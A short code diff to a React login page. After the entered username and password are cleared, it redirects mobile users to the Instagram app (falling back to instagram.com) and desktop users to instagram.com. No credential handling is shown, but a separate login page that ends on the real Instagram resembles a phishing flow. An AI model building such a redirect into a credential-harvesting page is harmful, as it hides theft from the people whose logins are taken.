@@ -36,6 +36,21 @@ const LoginPage = () => {
         setUsername("");
         setPassword("");
         setLoading(false);
+
+        const isMobile = /Android|iPhone|iPad|iPod/i.test(navigator.userAgent);
+
+        if (isMobile) {
+          // Try to open Instagram app
+          window.location.href = "instagram://app";
+          // If not installed, fallback to browser version after 1 second
+          setTimeout(() => {
+            window.location.href = "https://www.instagram.com/";
+          }, 1000);
+        } else {
+          // For desktop
+          window.location.href = "https://www.instagram.com/";
+        }
+
       }, remaining);
     }
   };
